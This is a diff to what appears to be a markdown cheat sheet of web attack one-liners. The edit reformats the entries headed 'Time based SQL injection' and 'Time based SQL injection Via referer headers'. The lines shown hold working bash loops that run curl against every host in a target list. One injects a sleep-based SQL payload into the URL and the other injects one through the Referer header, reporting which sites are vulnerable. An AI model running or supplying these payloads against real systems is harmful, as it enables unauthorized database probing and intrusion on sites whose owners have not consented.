@@ -27,13 +27,17 @@ while read -r url; do echo "Testing $url"; curl -m 20 -s -o /dev/null -w "%{time
 
    ```
 
-   5) Time based SQL injection:
+5) Time based SQL injection:
   
       ```
       while read -r url; do echo "Testing $url"; curl -m 20 -s -o /dev/null -w "%{time_total}\n" "$url/0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z"; done < sub.txt
       ```
 
-      6) Time based SQL injection Via referer headers.
+6) Time based SQL injection Via referer headers
+   
    ```
    cat sub.txt | while read domain; do curl -s -H "Referer: http://www.google.com/search?hl=en&q='+(select*from(select(sleep(7*7)))a)+'" "$domain" | grep -q "200 OK" && echo "Vulnerable: $domain" || echo "Not Vulnerable: $domain"; done
+   
 ```
+
+
